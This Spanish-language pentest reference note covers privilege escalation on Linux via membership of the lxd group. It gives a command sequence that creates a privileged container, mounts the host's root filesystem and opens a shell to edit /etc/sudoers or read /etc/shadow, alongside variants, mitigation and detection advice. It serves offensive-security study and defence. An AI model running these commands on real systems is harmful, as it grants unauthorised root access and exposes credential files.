---
topic: LXD — escalada por pertenencia al grupo
tags: [linux, lxd, container, privesc, mount]
---

# LXD — escalada por pertenencia al grupo

[🌐 English](lxd-group.en.md) | **Español**

## Concepto

Pertenecer al grupo `lxd` equivale a tener root: se puede crear un contenedor privilegiado, montar la raíz del host y modificar `/etc/sudoers` o leer `/etc/shadow`.

## Cuándo aplica

- Usuario en el grupo `lxd` o socket de LXD accesible.
- Imágenes locales o capacidad de importar una.
- Contenedores privilegiados permitidos.

## Procedimiento

1. Confirmar `id` y el acceso a `lxc`.
2. Importar una imagen mínima si no hay ninguna.
3. Crear un contenedor con `security.privileged=true`.
4. Añadir un disco con `/` del host.
5. Entrar y escribir en `/etc/sudoers`.

## Comandos

```bash
id
lxc image list
lxc init <IMAGE> privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/root
lxc start privesc && lxc exec privesc -- /bin/sh
```

## Variantes

- Montar el socket `/var/run/lxd.sock` desde otro contenedor.
- Usar `lxc file push` para escribir ficheros del host.
- Imagen importada desde un fichero local.

## Limitaciones

- El usuario debe estar en el grupo `lxd`.
- LXD puede requerir un daemon activo.
- Algunas configuraciones bloquean contenedores privilegiados.

## Mitigación

- No añadir usuarios normales al grupo `lxd`.
- Restringir la creación de contenedores privilegiados.
- Auditar el socket y las imágenes.

## Detección

- Contenedores nuevos con `security.privileged`.
- Montajes de `/` del host y escrituras en `/etc/sudoers`.

## Referencias

- <https://linuxcontainers.org/lxd/docs/latest/>
- <https://attack.mitre.org/techniques/T1611/>
